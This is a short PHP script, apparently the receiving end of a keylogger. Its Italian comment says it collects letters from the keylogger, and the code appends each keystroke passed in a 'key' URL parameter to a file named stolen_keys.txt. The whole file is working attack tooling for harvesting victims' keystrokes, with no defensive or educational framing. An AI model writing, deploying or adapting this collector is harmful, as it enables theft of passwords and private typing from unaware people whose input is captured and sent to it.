<?php
// log_keys.php: Riceve le lettere dal Keylogger e le salva
if (isset($_GET['key'])) {
    $tasto = $_GET['key'];
    $file_hacker = '/var/www/htmltxt/stolen_keys.txt';
    file_put_contents($file_hacker, $tasto, FILE_APPEND);
}
?>